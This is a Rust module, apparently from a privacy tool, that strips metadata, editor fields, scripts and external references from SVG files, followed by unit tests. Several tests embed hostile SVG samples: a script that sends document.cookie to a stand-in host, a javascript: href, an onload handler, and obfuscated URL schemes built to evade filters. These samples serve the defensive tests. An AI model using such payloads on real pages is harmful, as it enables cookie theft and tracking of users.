//! SVG: strip metadata, editor cruft, scripts and external references.
//!
//! SVG is an XML document, not a binary container, so it cannot be rebuilt from
//! an allowlist the way an image can: an unknown element is as likely to be a
//! legitimate shape as it is to be junk. This is therefore [`Assurance::BestEffort`]:
//! the things known to carry identity or to reach the network are removed, and
//! the rest is kept.
//!
//! What is removed:
//! - **`<metadata>` blocks** (Dublin Core / RDF), where the author, licence and
//!   editing tool are written.
//! - **Editor namespaces** (`inkscape:`, `sodipodi:`, `adobe:`, `i:`, ...) on
//!   both elements and attributes. These carry the application, its version,
//!   window geometry, the user's chosen zoom, guide layout, and sometimes a
//!   document name derived from a path.
//! - **XML comments**, a free-text field editors and people write into.
//! - **`<script>` elements and `on*` event handlers.** Not privacy but safety:
//!   an SVG opened in a browser can run script, and this tool's output should
//!   not.
//! - **External references** in `href` / `xlink:href` that point off-document
//!   (`http:`, `https:`, protocol-relative `//`, `file:`). An external
//!   reference makes the image fetch a resource when displayed, which both
//!   leaks that it was viewed and can pull in tracking. In-document references
//!   (`#id`) and inline `data:` URIs are kept.
//!
//! [`Assurance::BestEffort`]: crate::Assurance

use crate::report::{Assurance, Kind, Report};

/// Element names dropped whole, with their entire contents.
const DROP_ELEMENTS: &[&str] = &["metadata", "script", "sodipodi:namedview", "rdf:rdf"];

/// Namespace prefixes whose elements and attributes are editor bookkeeping.
const EDITOR_PREFIXES: &[&str] = &["inkscape:", "sodipodi:", "adobe:", "i:", "x:", "illustrator:"];

pub(crate) fn sanitize(
    input: &[u8],
    _policy: &crate::Policy,
    report: &mut Report,
) -> crate::Result<Vec<u8>> {
    report.assurance = Assurance::BestEffort;

    // SVG is text. Work on a lossless string; invalid UTF-8 is replaced, which
    // cannot corrupt the markup structure we key on (all ASCII).
    let text = String::from_utf8_lossy(input);
    let bytes = text.as_bytes();
    let mut out = String::with_capacity(text.len());

    let mut i = 0usize;
    let n = bytes.len();
    let mut removed_comments = 0usize;
    let mut removed_meta = 0usize;
    let mut removed_scripts = 0usize;
    let mut removed_editor = 0usize;
    let mut removed_ext = 0usize;

    while i < n {
        if bytes[i] != b'<' {
            out.push(text[i..].chars().next().unwrap_or('\u{FFFD}'));
            i += utf8_len(bytes[i]);
            continue;
        }

        // Comment: <!-- ... -->
        if bytes[i..].starts_with(b"<!--") {
            if let Some(end) = find(bytes, i + 4, b"-->") {
                removed_comments += 1;
                i = end + 3;
                continue;
            } else {
                break; // unterminated comment: drop the rest
            }
        }

        // CDATA is copied through: it holds CSS or text, and any script CDATA is
        // inside a <script> we drop wholesale.
        if bytes[i..].starts_with(b"<![CDATA[") {
            if let Some(end) = find(bytes, i + 9, b"]]>") {
                out.push_str(&text[i..end + 3]);
                i = end + 3;
                continue;
            }
        }

        // Doctype / processing instruction: copy through.
        if bytes[i..].starts_with(b"<!") || bytes[i..].starts_with(b"<?") {
            if let Some(end) = memchr(bytes, i, b'>') {
                out.push_str(&text[i..end + 1]);
                i = end + 1;
                continue;
            }
            break;
        }

        // A tag. Find its end '>', skipping any '>' that sits inside a quoted
        // attribute value. XML allows a literal '>' inside a value (only '<',
        // '&' and the delimiting quote are forbidden there), so a naive scan to
        // the first '>' could cut a tag short and re-emit the remainder — a live
        // on* handler or external href — as verbatim text, byte-for-byte.
        let Some(gt) = find_tag_gt(bytes, i) else {
            break;
        };
        let tag = &text[i..gt + 1];
        let name = tag_name(tag);

        if tag.starts_with("</") {
            out.push_str(tag); // closing tag: copy
            i = gt + 1;
            continue;
        }

        let self_closing = tag.ends_with("/>");
        let lname = name.to_ascii_lowercase();

        if is_dropped_element(&lname) {
            if lname == "metadata" || lname == "rdf:rdf" {
                removed_meta += 1;
            } else if lname == "script" {
                removed_scripts += 1;
            } else {
                removed_editor += 1;
            }
            if self_closing {
                i = gt + 1;
            } else {
                // Skip to the matching close tag, honouring nesting.
                i = skip_element(bytes, &text, gt + 1, &name);
            }
            continue;
        }

        // <style> is kept, but its CSS can carry an external url() or @import
        // that phones home. Emit the (scrubbed) start tag, then neutralise the
        // stylesheet body before the matching close tag.
        if lname == "style" && !self_closing {
            let (clean, ed, ext) = scrub_start_tag(tag);
            removed_editor += ed;
            removed_ext += ext;
            out.push_str(&clean);
            let content_start = gt + 1;
            let content_end = find_close_tag(bytes, &text, content_start, "style");
            let (clean_css, n) = neutralize_css(&text[content_start..content_end]);
            removed_ext += n;
            out.push_str(&clean_css);
            i = content_end; // the </style> tag itself is copied on the next pass
            continue;
        }

        // A kept element: rewrite its start tag, scrubbing attributes.
        let (clean, ed, ext) = scrub_start_tag(tag);
        removed_editor += ed;
        removed_ext += ext;
        out.push_str(&clean);
        i = gt + 1;
    }

    if removed_comments > 0 {
        report.removed(Kind::Comment, format!("{removed_comments} XML comment(s)"), 0);
    }
    if removed_meta > 0 {
        report.removed(Kind::Xmp, "metadata / RDF block", 0);
    }
    if removed_scripts > 0 {
        report.removed(Kind::UnknownStructure, format!("{removed_scripts} script element(s)"), 0);
    }
    if removed_editor > 0 {
        report.removed(Kind::DocumentInfo, format!("{removed_editor} editor field(s)"), 0);
    }
    if removed_ext > 0 {
        report.removed(Kind::UnknownStructure, format!("{removed_ext} external reference(s)"), 0);
    }
    report.warn(
        "SVG is XML, so it was cleaned by editing rather than rebuilt: metadata, editor \
         fields, comments, scripts and external references were removed, but an \
         application-specific element that carried something would have been kept",
    );

    Ok(out.into_bytes())
}

fn is_dropped_element(lname: &str) -> bool {
    // Match the LOCAL name (after any `prefix:`), so a namespaced `<svg:script>`
    // or `<html:script>` is dropped the same as a bare `<script>`.
    let local = lname.rsplit(':').next().unwrap_or(lname);
    DROP_ELEMENTS.contains(&local) || EDITOR_PREFIXES.iter().any(|p| lname.starts_with(p))
}

/// Presentation attributes whose value can be a FuncIRI `url(...)` reaching an
/// off-document resource. Their external `url()` is neutralised the same as a
/// `style`'s.
const FUNCIRI_ATTRS: &[&str] = &[
    "fill",
    "stroke",
    "filter",
    "mask",
    "clip-path",
    "cursor",
    "marker",
    "marker-start",
    "marker-mid",
    "marker-end",
];

/// Rewrite a start tag, dropping event handlers, editor-namespace attributes,
/// and external references. Returns the cleaned tag and the counts dropped.
fn scrub_start_tag(tag: &str) -> (String, usize, usize) {
    // tag looks like "<name attr=\"v\" .../>" or "<name ...>".
    let inner = &tag[1..tag.len() - if tag.ends_with("/>") { 2 } else { 1 }];
    let mut parts = inner.split_whitespace();
    let name = parts.next().unwrap_or("");

    let mut editor = 0usize;
    let mut ext = 0usize;
    let mut kept: Vec<String> = Vec::new();

    // Re-tokenise attributes properly (values may contain spaces).
    for attr in iter_attrs(inner, name.len()) {
        let (key, val) = split_attr(&attr);
        let lkey = key.to_ascii_lowercase();
        if lkey.starts_with("on") {
            editor += 1; // event handler
            continue;
        }
        if EDITOR_PREFIXES.iter().any(|p| lkey.starts_with(p)) {
            editor += 1;
            continue;
        }
        // href/src to an off-document or script-bearing target: drop the whole
        // attribute. `src` (e.g. inside a <foreignObject>'s HTML: <img src>,
        // <iframe src>) is treated like href — it was previously never inspected,
        // an open phone-home vector.
        if (lkey == "href" || lkey == "xlink:href" || lkey.ends_with(":href") || lkey == "src")
            && is_external_ref(val)
        {
            ext += 1;
            continue;
        }
        // A style attribute, or a presentation attribute that takes a FuncIRI
        // (fill, stroke, filter, mask, clip-path, marker*, cursor), can hold an
        // external url() reaching off-document; neutralise it in place rather
        // than dropping the whole (mostly harmless) attribute. Presentation
        // attributes were previously copied verbatim — the same beacon that was
        // blocked in `style` rode through in `fill="url(https://…)"`.
        if lkey == "style" || FUNCIRI_ATTRS.contains(&lkey.as_str()) {
            let (q, raw) = unquote(val);
            let (clean, n) = neutralize_css(raw);
            if n > 0 {
                ext += n;
                kept.push(format!("{key}={q}{clean}{q}"));
                continue;
            }
        }
        kept.push(attr);
    }

    let mut s = String::from("<");
    s.push_str(name);
    for a in kept {
        s.push(' ');
        s.push_str(a.trim());
    }
    if tag.ends_with("/>") {
        s.push_str("/>");
    } else {
        s.push('>');
    }
    (s, editor, ext)
}

/// Find the '>' that ends the tag beginning at `start`, ignoring any '>' inside
/// a quoted attribute value. Byte-based; the quote/`>` markers are all ASCII, so
/// a lossy-UTF-8 multi-byte char (high bytes only) can never be mistaken for one.
fn find_tag_gt(bytes: &[u8], start: usize) -> Option<usize> {
    let mut quote: Option<u8> = None;
    let mut j = start;
    while j < bytes.len() {
        let b = bytes[j];
        match (quote, b) {
            (Some(q), c) if c == q => quote = None,
            (Some(_), _) => {}
            (None, b'"') | (None, b'\'') => quote = Some(b),
            (None, b'>') => return Some(j),
            (None, _) => {}
        }
        j += 1;
    }
    None
}

/// True if a URL points off the document once a browser has normalised its
/// scheme: numeric character references decoded, ASCII whitespace/control
/// characters stripped. This is what catches obfuscated forms like
/// `&#104;ttp://`, `ht\ttp://` and `java\nscript:` that a raw `starts_with`
/// misses. `data:` is deliberately allowed (legitimate inline images); bare
/// relative paths and in-document `#id` fragments have no scheme.
fn points_off_document(v: &str) -> bool {
    let scheme = deobfuscate_scheme(v);
    scheme.starts_with("//") // protocol-relative //host, inherits the page scheme
        || matches!(
            scheme.as_str(),
            "http" | "https" | "ftp" | "ftps" | "file" | "ws" | "wss" | "javascript" | "vbscript"
        )
}

fn is_external_ref(val: &str) -> bool {
    let v = val.trim().trim_matches(['"', '\'']).trim();
    points_off_document(v)
}

/// The leading URI scheme (lower-cased, without the trailing `:`), de-obfuscated
/// the way a browser parses it: numeric character references decoded, and ASCII
/// whitespace / control characters dropped. Bounded to a short prefix.
fn deobfuscate_scheme(v: &str) -> String {
    let bytes = v.as_bytes();
    let mut out = String::new();
    let mut i = 0;
    while i < bytes.len() && out.len() < 16 {
        // Numeric character reference: &#dd; or &#xhh; — decode to its char.
        if bytes[i] == b'&' && bytes.get(i + 1) == Some(&b'#') {
            let mut j = i + 2;
            let hex = matches!(bytes.get(j), Some(b'x') | Some(b'X'));
            if hex {
                j += 1;
            }
            let start = j;
            while j < bytes.len() && bytes[j].is_ascii_hexdigit() {
                j += 1;
            }
            if let Some(ch) = std::str::from_utf8(&bytes[start..j])
                .ok()
                .and_then(|s| u32::from_str_radix(s, if hex { 16 } else { 10 }).ok())
                .and_then(char::from_u32)
            {
                if ch == ':' {
                    break;
                }
                if !ch.is_ascii_whitespace() && !ch.is_control() {
                    out.push(ch.to_ascii_lowercase());
                }
                i = if bytes.get(j) == Some(&b';') { j + 1 } else { j };
                continue;
            }
        }
        let ch = bytes[i] as char;
        if ch == ':' {
            break; // end of scheme
        }
        if !ch.is_ascii_whitespace() && !(bytes[i] < 0x20) {
            out.push(ch.to_ascii_lowercase());
        }
        i += 1;
    }
    out
}

/// Rewrite a chunk of CSS so it cannot reach off the document: every external
/// `url(...)` becomes `url(about:blank)` and every `@import` is dropped. Inline
/// `data:` URIs and in-document `url(#id)` fragments are left alone. Returns the
/// cleaned CSS and how many references were neutralised.
fn neutralize_css(css: &str) -> (String, usize) {
    let mut out = String::with_capacity(css.len());
    let mut count = 0usize;
    let bytes = css.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let rest = &css[i..];
        // Drop a whole @import statement up to its terminating ';'.
        if rest.len() >= 7 && rest[..7].eq_ignore_ascii_case("@import") {
            if let Some(semi) = rest.find(';') {
                count += 1;
                i += semi + 1;
                continue;
            } else {
                count += 1;
                break; // unterminated import: drop the remainder
            }
        }
        // Rewrite url(...) when it points off-document.
        if rest.len() >= 4 && rest[..4].eq_ignore_ascii_case("url(") {
            if let Some(close_rel) = rest.find(')') {
                let inner = &rest[4..close_rel];
                let target = inner.trim().trim_matches(['"', '\'']).trim();
                if points_off_document(target) {
                    out.push_str("url(about:blank)");
                    count += 1;
                    i += close_rel + 1;
                    continue;
                }
            }
        }
        let ch = rest.chars().next().unwrap();
        out.push(ch);
        i += ch.len_utf8();
    }
    (out, count)
}

/// Return the quote character used (as a str, possibly empty) and the value
/// with its surrounding quotes removed.
fn unquote(val: &str) -> (&'static str, &str) {
    let t = val.trim();
    if t.len() >= 2 && t.starts_with('"') && t.ends_with('"') {
        ("\"", &t[1..t.len() - 1])
    } else if t.len() >= 2 && t.starts_with('\'') && t.ends_with('\'') {
        ("'", &t[1..t.len() - 1])
    } else {
        ("", t)
    }
}

/// Split "key=value" (value may be quoted); returns (key, unquoted-ish value).
fn split_attr(attr: &str) -> (&str, &str) {
    match attr.find('=') {
        Some(eq) => (attr[..eq].trim(), attr[eq + 1..].trim()),
        None => (attr.trim(), ""),
    }
}

/// Iterate the attributes of a start tag's inner text, after the element name.
/// Handles quoted values that contain spaces.
fn iter_attrs(inner: &str, name_len: usize) -> Vec<String> {
    let rest = inner[name_len.min(inner.len())..].trim();
    let bytes = rest.as_bytes();
    let mut attrs = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        // skip whitespace
        while i < bytes.len() && bytes[i].is_ascii_whitespace() {
            i += 1;
        }
        let start = i;
        let mut quote = 0u8;
        while i < bytes.len() {
            let c = bytes[i];
            if quote != 0 {
                if c == quote {
                    quote = 0;
                }
            } else if c == b'"' || c == b'\'' {
                quote = c;
            } else if c.is_ascii_whitespace() {
                break;
            }
            i += 1;
        }
        if i > start {
            attrs.push(rest[start..i].to_string());
        }
    }
    attrs
}

fn tag_name(tag: &str) -> String {
    let s = tag.trim_start_matches('<').trim_start_matches('/');
    s.split(|c: char| c.is_ascii_whitespace() || c == '>' || c == '/')
        .next()
        .unwrap_or("")
        .to_string()
}

/// Return the index just past the matching close tag for `name`, honouring
/// nested elements of the same name. If none is found, consumes to end.
fn skip_element(bytes: &[u8], text: &str, from: usize, name: &str) -> usize {
    let open = format!("<{name}");
    let close = format!("</{name}");
    let mut depth = 1i32;
    let mut i = from;
    while i < bytes.len() {
        if bytes[i] == b'<' {
            let rest = &text[i..];
            if rest.len() >= close.len() && rest[..close.len()].eq_ignore_ascii_case(&close) {
                depth -= 1;
                if let Some(gt) = memchr(bytes, i, b'>') {
                    i = gt + 1;
                } else {
                    return bytes.len();
                }
                if depth == 0 {
                    return i;
                }
                continue;
            } else if rest.len() >= open.len()
                && rest[..open.len()].eq_ignore_ascii_case(&open)
                && rest
                    .as_bytes()
                    .get(open.len())
                    .is_some_and(|c| c.is_ascii_whitespace() || *c == b'>' || *c == b'/')
            {
                // a nested open of the same name (self-closing does not deepen)
                if let Some(gt) = memchr(bytes, i, b'>') {
                    if !text[i..gt + 1].ends_with("/>") {
                        depth += 1;
                    }
                    i = gt + 1;
                    continue;
                }
                return bytes.len();
            }
        }
        i += 1;
    }
    bytes.len()
}

/// Index of the `<` that begins the matching `</name>` close tag, or the end of
/// the buffer if there is none. Used for elements that do not nest (style).
fn find_close_tag(bytes: &[u8], text: &str, from: usize, name: &str) -> usize {
    let close = format!("</{name}");
    let mut i = from;
    while i < bytes.len() {
        if bytes[i] == b'<' {
            let rest = &text[i..];
            if rest.len() >= close.len() && rest[..close.len()].eq_ignore_ascii_case(&close) {
                return i;
            }
        }
        i += 1;
    }
    bytes.len()
}

fn memchr(bytes: &[u8], from: usize, needle: u8) -> Option<usize> {
    bytes[from..].iter().position(|&b| b == needle).map(|p| p + from)
}

fn find(bytes: &[u8], from: usize, needle: &[u8]) -> Option<usize> {
    if from >= bytes.len() {
        return None;
    }
    bytes[from..].windows(needle.len()).position(|w| w == needle).map(|p| p + from)
}

fn utf8_len(first: u8) -> usize {
    match first {
        0x00..=0x7F => 1,
        0xC0..=0xDF => 2,
        0xE0..=0xEF => 3,
        0xF0..=0xF7 => 4,
        _ => 1,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::report::Report;
    use crate::Format;

    fn run(input: &str) -> (String, Report) {
        let mut report = Report::new(Format::Svg, input.len());
        let out = sanitize(input.as_bytes(), &crate::Policy::default(), &mut report).unwrap();
        (String::from_utf8_lossy(&out).into_owned(), report)
    }

    #[test]
    fn metadata_block_is_removed_but_shapes_survive() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><metadata><rdf><dc:creator>Jane Photographer</dc:creator></rdf></metadata><rect x="0" y="0" width="10" height="10"/></svg>"#;
        let (out, report) = run(svg);
        assert!(!out.contains("Jane Photographer"), "author survived");
        assert!(out.contains("<rect"), "the shape was dropped");
        assert!(report.removed.iter().any(|r| r.kind == Kind::Xmp));
    }

    #[test]
    fn a_script_element_is_removed() {
        let svg = r#"<svg><script>fetch('http://evil.example/'+document.cookie)</script><circle r="5"/></svg>"#;
        let (out, report) = run(svg);
        assert!(!out.contains("fetch"), "script survived");
        assert!(out.contains("<circle"));
        assert!(report.removed.iter().any(|r| r.location.contains("script")));
    }

    #[test]
    fn event_handlers_and_editor_attributes_are_stripped() {
        let svg = r#"<svg onload="steal()" inkscape:version="1.1" sodipodi:docname="/home/jane/secret.svg"><rect width="1" height="1"/></svg>"#;
        let (out, _r) = run(svg);
        assert!(!out.contains("onload"), "event handler survived");
        assert!(!out.contains("inkscape:version"), "editor attr survived");
        assert!(!out.contains("secret.svg"), "the doc path leaked");
        assert!(out.contains("<svg"), "the root element was lost");
    }

    #[test]
    fn external_references_are_removed_but_local_ones_kept() {
        let svg = r##"<svg><image href="https://tracker.example/pixel.png"/><use href="#localshape"/><image href="data:image/png;base64,AAAA"/></svg>"##;
        let (out, report) = run(svg);
        assert!(!out.contains("tracker.example"), "external ref survived (phones home)");
        assert!(out.contains("#localshape"), "a local reference was wrongly dropped");
        assert!(out.contains("data:image"), "an inline data URI was wrongly dropped");
        assert!(report.removed.iter().any(|r| r.location.contains("external")));
    }

    #[test]
    fn external_css_url_and_import_are_neutralised() {
        let svg = r#"<svg><style>@import url(http://evil.example/x.css); .a{fill:url(https://track.example/p.png)} .b{fill:url(#grad)}</style><rect class="a" style="background:url(http://leak.example/1.gif)"/></svg>"#;
        let (out, report) = run(svg);
        assert!(!out.contains("evil.example"), "@import survived");
        assert!(!out.contains("track.example"), "external url() in stylesheet survived");
        assert!(!out.contains("leak.example"), "external url() in style attr survived");
        assert!(out.contains("url(#grad)"), "an in-document url(#id) was wrongly removed");
        assert!(out.contains("<rect"), "the shape was lost");
        assert!(report.removed.iter().any(|r| r.location.contains("external")));
    }

    #[test]
    fn a_javascript_scheme_href_is_removed() {
        let svg = r#"<svg><a href="javascript:alert(document.cookie)"><rect/></a></svg>"#;
        let (out, _r) = run(svg);
        assert!(!out.contains("javascript:"), "javascript: href survived");
        assert!(out.contains("<rect"));
    }

    #[test]
    fn comments_are_removed() {
        let svg = "<svg><!-- created by Jane on her home machine --><rect/></svg>";
        let (out, _r) = run(svg);
        assert!(!out.contains("Jane"), "comment survived");
        assert!(out.contains("<rect"));
    }

    #[test]
    fn a_greater_than_inside_an_attribute_does_not_end_the_tag_early() {
        // XML allows a literal '>' inside a quoted value. A naive scan to the
        // first '>' cut the tag at `data-x="a>` and re-emitted the trailing
        // href as verbatim text, smuggling the external reference through intact.
        let svg = r#"<svg><image data-x="a>b" href="https://tracker.example/pixel.png"/></svg>"#;
        let (out, report) = run(svg);
        assert!(!out.contains("tracker.example"), "external ref smuggled past the tag scan");
        assert!(report.removed.iter().any(|r| r.location.contains("external")));
    }

    #[test]
    fn an_obfuscated_external_scheme_is_still_removed() {
        // A browser decodes character references and strips control characters
        // inside a URL scheme before fetching, so these reach the network; the
        // scrub must compare against the de-obfuscated scheme, not the raw text.
        let svg = concat!(
            "<svg>",
            r#"<image href="&#104;ttp://tracker.example/a.png"/>"#,
            r#"<image href="ht&#9;tp://tracker.example/b.png"/>"#,
            "</svg>"
        );
        let (out, report) = run(svg);
        assert!(!out.contains("tracker.example"), "obfuscated external ref survived");
        assert!(report.removed.iter().filter(|r| r.location.contains("external")).count() >= 1);
    }

    #[test]
    fn malformed_svg_does_not_panic() {
        for s in
            ["<svg", "<svg><metadata", "<!--", "<![CDATA[", "<svg><script>", "<>", "<svg attr='"]
        {
            let mut report = Report::new(Format::Svg, s.len());
            let _ = sanitize(s.as_bytes(), &crate::Policy::default(), &mut report);
        }
    }
}
